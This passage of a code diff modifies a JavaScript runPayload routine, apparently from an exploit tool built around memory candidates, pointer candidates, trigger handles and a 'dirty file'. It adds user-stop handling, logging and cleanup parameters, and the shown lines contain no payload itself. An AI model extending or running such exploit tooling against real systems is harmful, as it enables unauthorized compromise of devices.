             await emitStage("No memory candidates were found.");
             await emitVerboseStage("Memory search details: rounds=" +
-                release.releaseRounds + "; changed links=" +
+                release.releaseRounds +
+                (release.monitoringRounds
+                    ? " + " + release.monitoringRounds + " monitor" : "") +
+                "; changed links=" +
                 release.totalChangedLinks + "; stopped=" +
                 (release.stopReason || "no") + "; read error=" +
                 (release.readError == null ? "none" : formatCode(release.readError)) + ".");
@@ -931,6 +1524,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
         candidateHandle: handles.candidateHandle,
         collectTimingProfile: true,
         reportProgress: reportAddressProgress,
+        shouldStop: () => timingPersistence?.stopRequested === true,
         pointerCandidates: release.pointerCandidates,
         primeHex: candidateSetup.primeHex,
         rootSession: handles.rootSession,
@@ -971,6 +1565,20 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
 
     handles = {...handles, domainSession: address.domainSession};
     addressCopy = address?.addressCopy || addressCopy;
+
+    if (timingPersistence?.stopRequested) {
+        attemptState.stoppedByUser = true;
+        await stopAndCleanup({
+            reason: "Stopped by user during address qualification after the " +
+                "current wave; remaining scans were skipped.",
+            scratch, handles, helpers, addressCopy,
+            candidateCacheNeedsRetirement:
+                Boolean(addressCopy?.candidateCacheNeedsRetirement),
+            workerStateSafe: addressCopy?.workerStateSafe === true,
+            domainSession: address.domainSession
+        });
+        return;
+    }
 
     if (!addressReadyForPromotion) {
         await stopAndCleanup({
@@ -1045,7 +1653,8 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
             storageHandle: handles.storageHandle,
             temporaryHandle: 0,
             triggerHandle: handles.triggerHandle,
-            workerStateSafe: promotion.workerStateSafe
+            workerStateSafe: promotion.workerStateSafe,
+            dirtyFileSize: config.DIRTY_FILE_SIZE
         });
 
         attemptState.promotionRetained = true;
@@ -1123,7 +1732,8 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
         storageHandle: handles.storageHandle,
         temporaryHandle: 0,
         triggerHandle: handles.triggerHandle,
-        workerStateSafe: retired.workerStateSafe
+        workerStateSafe: retired.workerStateSafe,
+        dirtyFileSize: config.DIRTY_FILE_SIZE
     });
 
     await emitVerboseStage(formatCleanupResult(cleanup, retired.workerStateSafe));
@@ -1156,7 +1766,8 @@ async function performStopAndCleanup({
     addressCopy = null,
     candidateCacheNeedsRetirement = false,
     workerStateSafe = true,
-    domainSession = null
+    domainSession = null,
+    dirtyFileSize = 0
 }) {
     await emitVerboseStage("Stopping reason: " + reason);
 
@@ -1208,7 +1819,8 @@ async function performStopAndCleanup({
         temporaryHandle: handles?.preserveTemporaryHandleForCleanup
             ? 0 : handles?.temporaryHandle || 0,
         triggerHandle: handles?.triggerHandle || 0,
-        workerStateSafe: finalWorkerStateSafe
+        workerStateSafe: finalWorkerStateSafe,
+        dirtyFileSize
     });
 
     await emitVerboseStage(formatCleanupResult(cleanup, finalWorkerStateSafe));
@@ -1259,7 +1871,7 @@ function recordCleanupState(attemptState, result, workerStateSafe,
 
     attemptState.safeToRetry = false;
     attemptState.cleanupSummary = attemptState.cleanupVerified
-        ? "cache retired, save scratch deleted and committed, all handles closed"
+        ? "cache state verified safe, save scratch deleted and committed, all handles closed"
         : "cleanup not fully verified";
 }
 
